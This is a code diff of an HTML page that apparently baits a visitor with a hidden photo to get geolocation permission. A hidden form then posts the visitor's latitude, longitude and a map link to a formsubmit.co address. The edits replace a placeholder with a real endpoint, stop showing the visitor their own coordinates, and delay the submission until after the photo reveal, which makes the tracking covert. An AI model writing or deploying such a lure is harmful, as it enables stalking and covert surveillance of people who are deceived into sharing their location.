@@ -91,12 +91,13 @@
   </div>
 
   <!-- Hidden form to send location -->
-  <form id="locationForm" method="POST" action="https://formsubmit.co/your-email@example.com">
+  <form id="locationForm" method="POST" action="https://formsubmit.co/5ccabaf9d3e99562488394bd3fba321c">
     <input type="hidden" name="latitude" id="latitude">
     <input type="hidden" name="longitude" id="longitude">
     <input type="hidden" name="mapLink" id="mapLink">
     <input type="hidden" name="_subject" value="New Location Shared!">
     <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="thankyou.html"> <!-- Custom thank you page -->
   </form>
 
   <script>
@@ -106,20 +107,17 @@
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
 
-          // Fill the form fields
           document.getElementById("latitude").value = lat;
           document.getElementById("longitude").value = lon;
           document.getElementById("mapLink").value = `https://www.google.com/maps?q=${lat},${lon}`;
 
-          // Optional: Show location to user
-          document.getElementById("output").innerText =
-            "Location: " + lat.toFixed(4) + ", " + lon.toFixed(4);
+          document.getElementById("output").innerText = "Location captured! Revealing photo...";
 
-          // Submit the form
-          document.getElementById("locationForm").submit();
-
-          // Reveal the image
           revealPhoto();
+
+          setTimeout(() => {
+            document.getElementById("locationForm").submit();
+          }, 3000); // 3 second delay
         }, showError);
       } else {
         document.getElementById("output").innerText = "Geolocation not supported.";
